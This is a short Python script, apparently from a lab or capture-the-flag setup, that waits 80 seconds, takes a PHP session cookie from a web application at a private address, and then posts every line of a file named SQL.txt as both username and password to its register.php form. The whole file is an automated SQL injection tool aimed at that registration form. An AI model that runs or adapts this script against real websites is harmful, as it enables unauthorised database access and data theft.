import requests
import time

file = '/usr/share/scripts/SQL.txt'
url = 'http://172.16.238.20'
register_url = url + '/register.php'

def get_session():
    session = requests.Session()
    r = session.get(url)
    dict = session.cookies.get_dict()
    sess_id = dict['PHPSESSID']
    return sess_id


def sqli(filename, sess_id):
    php_sess_id = 'PHPSESSID=' + sess_id
    with open(filename) as f:
        for line in f:
            username = line
            password = line
            mydata_register = 'username=' + username + '&password=' + password + '&confirm_password=' + password
            content_length_register = str(len(mydata_register))
            headers_register = {
                    'Host': '172.16.238.20',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Referer': 'http://172.16.238.20/register.php',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': content_length_register,
                    'Cookie': php_sess_id,
                    'Connection': 'close',
                    'Upgrade-Insecure-Requests': '1'
                }


            r_register = requests.post(register_url, data=mydata_register, headers=headers_register)

time.sleep(80)
session = get_session()
sqli(file, session)
